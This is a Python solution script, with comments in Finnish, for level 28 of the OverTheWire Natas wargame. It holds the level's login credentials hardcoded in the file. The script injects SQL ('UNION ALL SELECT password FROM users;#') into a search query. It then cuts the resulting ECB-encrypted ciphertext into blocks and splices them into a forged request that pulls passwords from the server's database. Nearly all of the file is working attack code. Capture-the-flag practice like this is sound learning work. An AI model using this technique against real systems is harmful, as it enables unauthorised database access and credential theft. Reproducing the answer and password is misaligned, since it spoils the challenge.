# THIS IS FOR LEVEL 28 AND IT WILL GIVE THE ANSWERS FOR THE NATAS29 PASSWORD - 2 method
import requests
from urllib.parse import unquote, quote
import binascii
import base64

# 🔐 Tiedot
base_url = "http://natas28.natas.labs.overthewire.org"
index_url = f"{base_url}/index.php"
search_url = f"{base_url}/search.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
block_size_bytes = 16
block_size_hex = block_size_bytes * 2

# 🔹 1. Luo baseline: tyhjä kysely (10 välilyöntiä)
baseline_query = " " * 10
res_baseline = requests.post(index_url, data={"query": baseline_query}, auth=(username, password))
baseline_b64 = unquote(res_baseline.url.split('=')[1])
baseline_bytes = base64.b64decode(baseline_b64)
baseline_hex = binascii.hexlify(baseline_bytes).decode()

print("[+] Baseline hex:")
print(baseline_hex)
print(f"[+] Total length: {len(baseline_hex)} hex chars ({len(baseline_hex)//block_size_hex} blocks)")

# Poimi header ja footer
header = baseline_bytes[:48]  # 3 lohkoa
footer = baseline_bytes[48:]  # loput

# 🔹 2. Luo SQL-injektio
injection = "         ' UNION ALL SELECT password FROM users;#"
print(f"\n[+] Injection string:\n{injection}")
print(f"[+] Injection length: {len(injection)} characters")

res_inject = requests.post(index_url, data={"query": injection}, auth=(username, password))
inject_b64 = unquote(res_inject.url.split('=')[1])
inject_bytes = base64.b64decode(inject_b64)
inject_hex = binascii.hexlify(inject_bytes).decode()

print("\n[+] Injection hex:")
print(inject_hex)
print(f"[+] Total length: {len(inject_hex)} hex chars ({len(inject_hex)//block_size_hex} blocks)")

# 🔹 3. Tulosta lohkot
print("\n[+] Injection blocks:")
inject_blocks = []
for i in range(len(inject_bytes) // block_size_bytes):
    block = inject_bytes[i*block_size_bytes:(i+1)*block_size_bytes]
    inject_blocks.append(block)
    print(f"Block {i}: {binascii.hexlify(block).decode()}")

# 🔹 4. Poimi injektion ytimen lohkot (lohko 3–6)
middle = b''.join(inject_blocks[3:7])  # voit säätää lohkoja tarpeen mukaan

# 🔹 5. Rakenna lopullinen salattu kysely
final_bytes = header + middle + footer
final_b64 = base64.b64encode(final_bytes).decode()
final_url = quote(final_b64, safe='')

print("\n[+] Final crafted URL parameter:")
print(final_url)

# 🔹 6. Testaa palvelimella
print("\n[+] Sending final request to search.php...")
res_final = requests.get(search_url, params={"query": final_b64}, auth=(username, password))
print("\n[+] Server response:")
print(res_final.text)
